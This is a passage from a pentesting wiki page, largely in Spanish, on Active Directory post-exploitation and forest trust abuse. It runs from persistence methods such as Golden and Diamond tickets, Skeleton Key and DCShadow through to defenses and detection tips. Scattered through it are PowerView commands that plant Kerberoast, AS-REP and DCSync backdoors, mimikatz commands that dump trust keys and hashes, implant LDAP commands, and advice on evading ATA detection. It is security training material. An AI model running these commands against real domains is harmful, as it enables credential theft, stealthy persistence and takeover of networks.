### Abuse de sesiones de terceros

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrador local** en equipos unidos al dominio, asegurando que sea **aleatoria**, única y se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs solo para usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Recopilar certificates** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si se configuran **vulnerable templates** es posible abusarlas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una vez que obtengas privilegios de **Domain Admin** o incluso mejor **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas comentadas antes pueden usarse para persistencia.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **Ticket Granting Service (TGS) ticket** legítimo para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta del PC**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtiene acceso al **NTLM hash de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como golden tickets forjados de una forma que **elude los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Tener certificates de una cuenta o poder solicitarlos** es una muy buena forma de poder persistir en la cuenta de usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificates también permite persistir con privilegios altos dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory garantiza la seguridad de los **privileged groups** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a través de estos grupos para evitar cambios no autorizados. Sin embargo, esta función puede ser explotada; si un atacante modifica la ACL de AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene un control extenso sobre todos los privileged groups. Esta medida de seguridad, pensada para proteger, puede por tanto volverse en contra, permitiendo acceso no autorizado salvo que se supervise de cerca.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **local administrator**. Al obtener privilegios de admin en una máquina así, el hash del local Administrator puede extraerse usando **mimikatz**. Después de esto, es necesaria una modificación del registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta de local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Podrías **dar** algunos **permisos especiales** a un **usuario** sobre algunos objetos de dominio específicos que le permitirán **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** un **objeto**. Si puedes simplemente **hacer** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa de la clase auxiliar `dynamicObject` para crear principals/GPOs/DNS records de vida corta con `entryTTL`/`msDS-Entry-Time-To-Die`; se autodestruyen sin tombstones, borrando evidencia LDAP mientras dejan SIDs huérfanos, referencias `gPLink` rotas o respuestas DNS en caché (por ejemplo, contaminación de ACE de AdminSDHolder o redirecciones maliciosas de `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** en memoria para establecer una **contraseña universal**, concediendo acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Aprende qué es un SSP (Security Support Provider) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **empujar atributos** (SIDHistory, SPNs...) sobre objetos especificados **sin** dejar ningún **log** respecto a las **modificaciones**. **Necesitas DA** privilegios y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Antes hemos discutido cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un solo dominio podría potencialmente llevar al compromiso de todo el Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **domain** acceder a recursos en otro **domain**. Esencialmente crea un vínculo entre los sistemas de autenticación de los dos dominios, permitiendo que las verificaciones de autenticación fluyan sin interrupciones. Cuando los dominios configuran una confianza, intercambian y conservan **keys** específicas dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad de la confianza.

En un escenario típico, si un usuario desea acceder a un servicio en un **trusted domain**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** al DC de su propio dominio. Este TGT se cifra con una **key** compartida que ambos dominios han acordado. Luego, el usuario presenta este TGT al **DC del trusted domain** para obtener un service ticket (**TGS**). Tras la validación satisfactoria del inter-realm TGT por parte del DC del trusted domain, este emite un TGS, concediendo al usuario acceso al servicio.

**Steps**:

1. Un **client computer** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente entonces solicita un **inter-realm TGT** a DC1, que es necesario para acceder a recursos en **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la confianza de dominio bidireccional.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor en Domain 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio en Domain 2.

### Different trusts

Es importante notar que **una trust puede ser de 1 vía o de 2 vías**. En las opciones de 2 vías, ambos dominios confiarán el uno en el otro, pero en la trust relation de **1 vía** uno de los dominios será el **trusted** y el otro el **trusting**. En el último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted one**.

Si Domain A confía en Domain B, A es el trusting domain y B es el trusted one. Además, en **Domain A**, esto sería una **Outbound trust**; y en **Domain B**, sería una **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta es una configuración común dentro del mismo forest, donde un child domain tiene automáticamente una two-way transitive trust con su parent domain. Esencialmente, esto significa que las solicitudes de autenticación pueden fluir sin interrupciones entre el padre y el hijo.
- **Cross-link Trusts**: Denominadas "shortcut trusts", se establecen entre child domains para agilizar los procesos de referral. En forests complejos, los referrals de autenticación normalmente tienen que viajar hasta el forest root y luego bajar hasta el target domain. Al crear cross-links, el recorrido se acorta, lo cual es especialmente útil en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios diferentes, no relacionados, y por naturaleza no son transitivas. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), los external trusts son útiles para acceder a recursos en un domain fuera del current forest que no está conectado por un forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas trusts se establecen automáticamente entre el forest root domain y un tree root recién añadido. Aunque no son comunes, las tree-root trusts son importantes para añadir nuevos domain trees a un forest, permitiéndoles mantener un unique domain name y asegurando two-way transitivity. Puede encontrarse más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es una two-way transitive trust entre dos forest root domains, aplicando también SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas trusts se establecen con Kerberos domains no-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). Las MIT trusts son algo más especializadas y están pensadas para entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship también puede ser **transitive** (A trust B, B trust C, entonces A trust C) o **non-transitive**.
- Una trust relationship puede configurarse como **bidirectional trust** (ambos confían entre sí) o como **one-way trust** (solo uno de ellos confía en el otro).

### Attack Path

1. **Enumerate** las trusting relationships
2. Comprueba si algún **security principal** (user/group/computer) tiene **access** a recursos del **other domain**, quizá mediante entradas ACE o por estar en grupos del other domain. Busca **relationships across domains** (la trust se creó probablemente por esto).
1. kerberoast en este case podría ser otra opción.
3. **Compromise** las **accounts** que pueden **pivot** entre dominios.

Los attackers con could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Los principals podrían añadirse a grupos locales en máquinas, como el grupo “Administrators” en un servidor, concediéndoles un control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Los principals también pueden ser miembros de grupos dentro del foreign domain. Sin embargo, la eficacia de este método depende de la naturaleza de la trust y del alcance del grupo.
- **Access Control Lists (ACLs)**: Los principals podrían especificarse en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, dándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Find external users/groups with permissions

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán user/group de **un dominio/forest externo**.

Podrías comprobar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilegios de Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC actúa como un repositorio central para los datos de configuración en entornos de Active Directory (AD) de todo un forest. Estos datos se replican a cada Domain Controller (DC) dentro del forest, y los DC con permisos de escritura mantienen una copia escribible del Configuration NC. Para explotar esto, se debe tener **privilegios SYSTEM en un DC**, preferiblemente un DC hijo.

**Link GPO to root DC site**

El contenedor Sites del Configuration NC incluye información sobre los sites de todos los equipos unidos al dominio dentro del AD forest. Operando con privilegios SYSTEM en cualquier DC, los atacantes pueden vincular GPOs a los root DC sites. Esta acción potencialmente compromete el root domain manipulando las policies aplicadas a estos sites.

Para obtener información más profunda, se puede explorar research sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de ataque implica apuntar a gMSAs privilegiadas dentro del domain. La KDS Root key, esencial para calcular las passwords de las gMSAs, se almacena dentro del Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las passwords de cualquier gMSA en todo el forest.

El análisis detallado y la guía paso a paso se pueden encontrar en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperando la creación de nuevos objetos privilegiados de AD. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría llevar a acceso no autorizado y control sobre objetos de AD recién creados.

Hay más información en [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 apunta al control sobre objetos de Public Key Infrastructure (PKI) para crear una certificate template que permita autenticarse como cualquier usuario dentro del forest. Como los objetos PKI residen en el Configuration NC, comprometer un child DC escribible permite ejecutar ataques ESC5.

Se pueden leer más detalles sobre esto en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el atacante tiene la capacidad de configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario **your domain is trusted** por uno externo dándote **undetermined permissions** sobre él. Necesitarás encontrar **qué principals de tu dominio tienen qué access sobre el external domain** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu domain** está **confiando** ciertos **privileges** a un principal de **different domains**.

Sin embargo, cuando un **domain is trusted** por el trusting domain, el trusted domain **crea un user** con un **nombre predecible** que usa como **password the trusted password**. Lo que significa que es posible **access to a user from the trusting domain to get inside the trusted one** para enumerarlo e intentar escalar más privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el trusted domain es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la domain trust (lo cual no es muy común).

Otra forma de comprometer el trusted domain es esperar en una máquina donde un **user from the trusted domain can access** para iniciar sesión via **RDP**. Entonces, el attacker podría inyectar code en el proceso de la sesión RDP y **access the origin domain of the victim** desde ahí.\
Además, si la **victim mounted his hard drive**, desde el proceso de la sesión **RDP** el attacker podría almacenar **backdoors** en la **startup folder of the hard drive**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SID history a través de forest trusts se mitiga con SID Filtering, que se activa por defecto en todos los inter-forest trusts. Esto se basa en la suposición de que los intra-forest trusts son seguros, considerando el forest, y no el domain, como el security boundary según la postura de Microsoft.
- Sin embargo, hay un inconveniente: SID filtering podría afectar aplicaciones y el acceso de users, lo que lleva a su desactivación ocasional.

### **Selective Authentication:**

- Para inter-forest trusts, emplear Selective Authentication garantiza que los users de los dos forests no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los users accedan a domains y servers dentro del trusting domain o forest.
- Es importante señalar que estas medidas no protegen contra la explotación del writable Configuration Naming Context (NC) o ataques sobre la trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives LDAP de escritura para escalada y persistencia

- Los BOFs de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina donde existan permisos de OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` secuestran directamente los objetivos una vez que se encuentran permisos de write-property.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en reseteos de contraseña, control de membresía de grupos o privilegios de replicación DCSync sin dejar artefactos de PowerShell/ADSI. Los equivalentes `remove-*` limpian los ACE inyectados.

### Delegation, roasting y abuso de Kerberos

- `add-spn`/`set-spn` convierten de inmediato a un usuario comprometido en Kerberoastable; `add-asreproastable` (cambio de UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, flags de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, traslado de OU y configuración de la superficie de ataque

- `add-sidhistory` inyecta SIDs privilegiados en el sid history de un principal controlado (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa completamente sobre LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo arrastrar activos a OUs donde ya existen permisos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Los comandos de eliminación con alcance estricto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador obtenga credenciales o persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Aprende más sobre cómo proteger credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Para tareas que requieran privilegios de DA, su duración debe limitarse. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event IDs 2889/3074/3075 y luego aplica LDAP signing más LDAPS channel binding en DCs/clients para bloquear intentos de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a nivel de protocolo de la actividad de Impacket

Si quieres detectar tradecraft común de AD, **no te bases solo en artefactos controlados por el operador** como binarios renombrados, nombres de servicio, archivos batch temporales o rutas de salida. Establece una línea base de cómo los clientes Windows legítimos generan tráfico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI, y luego busca **peculiaridades de implementación** que persisten incluso después de que el operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.

- **Candidatos independientes de alta confianza** (tras validarlos contra tu propia línea base):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Relleno de autenticación DCE/RPC con `0xff`
- Bindings LDAP Kerberos que colocan un `AP-REQ` Kerberos en bruto directamente en `mechToken` de SPNEGO
- Solicitudes SMB2/3 negotiate con valores `ClientGuid` que parecen ASCII
- `IWbemLevel1Login::NTLMLogin` de WMI usando el namespace no estándar `//./root/cimv2`
- Valores de nonce Kerberos codificados de forma fija
- **Mejor como features de correlación/scoring**:
- Listas de etype Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente, o orden de etypes en TGS-REQ diferente del Windows nativo
- Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
- NTLMSSP en bruto transportado en DCE/RPC en lugar de SPNEGO, trailers de verificación DCE/RPC ausentes o desajustes de OID SPNEGO/Kerberos
- Varios de estos rasgos del mismo host/usuario/ventana temporal son mucho más fuertes que cualquier campo débil individual
- **Usar como enriquecimiento, no como alertas independientes**:
- Nombres de archivo por defecto, rutas de salida, nombres de servicio aleatorios, nombres batch temporales, nombres de cuentas de equipo por defecto y cadenas HTTP/WebDAV/RDP/MSSQL específicas de la herramienta
- Son fáciles de cambiar por el operador y se usan mejor para explicar por qué un clúster entre protocolos es sospechoso
- **Notas operativas**:
- Algunas de estas señales requieren tráfico descifrado, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
- Valida contra clientes Samba/Linux, appliances y software legado antes de promoverlas a alertas
- Promueve las detecciones de enriquecimiento -> hunting -> alerting a medida que aumente tu confianza en la línea base

### **Implementing Deception Techniques**

- Implementar deception implica tender trampas, como usuarios o computers señuelo, con características como contraseñas que no expiran o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más información sobre el despliegue de deception techniques puede encontrarse en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Para objetos User**: Los indicadores sospechosos incluyen ObjectSID atípico, inicios de sesión infrecuentes, fechas de creación y recuentos bajos de bad password.
- **Indicadores generales**: Comparar atributos de posibles objetos señuelo con los de objetos reales puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar estas deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar la enumeración de sesiones en Domain Controllers para impedir la detección de ATA.
- **Ticket Impersonation**: Usar claves **aes** para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **DCSync Attacks**: Se recomienda ejecutarlos desde un equipo que no sea Domain Controller para evitar la detección de ATA, ya que la ejecución directa desde un Domain Controller activará alertas.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
